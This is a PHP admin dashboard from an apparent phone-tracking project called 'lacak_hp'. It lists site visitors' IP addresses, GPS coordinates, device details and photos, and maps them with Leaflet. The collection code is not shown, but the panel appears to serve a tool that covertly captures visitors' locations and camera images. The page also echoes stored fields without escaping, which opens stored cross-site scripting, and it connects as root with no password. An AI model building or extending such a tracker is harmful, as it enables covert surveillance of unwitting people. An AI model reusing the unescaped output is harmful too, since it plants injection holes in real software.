<?php

session_start();

if(!isset($_SESSION['admin'])) {
    header("Location: login.php");
    exit();
}

// ===============================
// DATABASE
// ===============================
$host = "localhost";
$user = "root";
$pass = "";
$db   = "lacak_hp";

$conn = new mysqli($host, $user, $pass, $db);

$result = $conn->query("SELECT * FROM pengunjung ORDER BY id DESC");

$mapData = $conn->query("SELECT * FROM pengunjung");

$locations = [];

while($row = $mapData->fetch_assoc()) {

    if(strpos($row['lokasi'], ",") !== false) {

        $locations[] = [
            "ip" => $row['ip_address'],
            "lokasi" => $row['lokasi'],
            "perangkat" => $row['perangkat'],
            "foto" => $row['foto'],
            "waktu" => $row['waktu']
        ];
    }
}

?>

<!DOCTYPE html>
<html>

<head>

<title>Admin Panel</title>

<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>

<style>

body {
    margin:0;
    background:#0a0a0a;
    color:white;
    font-family:Arial;
}

header {
    background:black;
    padding:15px;
    display:flex;
    justify-content:space-between;
}

.logout {
    background:red;
    padding:8px 15px;
    color:white;
    text-decoration:none;
}

.container {
    padding:20px;
}

table {
    width:100%;
    border-collapse:collapse;
    background:#111;
}

th, td {
    border:1px solid #333;
    padding:10px;
    text-align:center;
}

th {
    background:#222;
}

img {
    width:80px;
    border-radius:5px;
}

#map {
    height:450px;
    margin-top:30px;
    border-radius:10px;
}

.popup-img {
    width:120px;
    border-radius:5px;
}

</style>

</head>

<body>

<header>

<div>ADMIN PANEL</div>

<a class="logout" href="logout.php">Logout</a>

</header>

<div class="container">

<h2>Data Pengunjung</h2>

<table>

<tr>
<th>ID</th>
<th>IP</th>
<th>Lokasi</th>
<th>Perangkat</th>
<th>Foto</th>
<th>Waktu</th>
</tr>

<?php while($row = $result->fetch_assoc()) { ?>

<tr>

<td><?php echo $row['id']; ?></td>

<td><?php echo $row['ip_address']; ?></td>

<td><?php echo $row['lokasi']; ?></td>

<td style="font-size:12px">
<?php echo $row['perangkat']; ?>
</td>

<td>
<img src="foto/<?php echo $row['foto']; ?>">
</td>

<td><?php echo $row['waktu']; ?></td>

</tr>

<?php } ?>

</table>

<h2>Peta Lokasi Pengunjung</h2>

<div id="map"></div>

</div>

<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>

<script>

var map = L.map('map').setView([-2.5, 118], 5);

L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: 'OpenStreetMap'
}).addTo(map);

var data = <?php echo json_encode($locations); ?>;

data.forEach(function(user){

    var parts = user.lokasi.split(",");

    var lat = parseFloat(parts[0]);
    var lng = parseFloat(parts[1]);

    if(!isNaN(lat) && !isNaN(lng)) {

        var popup = `
            <b>IP:</b> ${user.ip}<br>
            <b>Lokasi:</b> ${user.lokasi}<br>
            <b>Perangkat:</b><br>
            <small>${user.perangkat}</small><br>
            <b>Waktu:</b> ${user.waktu}<br><br>
            <img class="popup-img" src="foto/${user.foto}">
        `;

        L.marker([lat, lng])
        .addTo(map)
        .bindPopup(popup);

    }

});

</script>

</body>
</html>
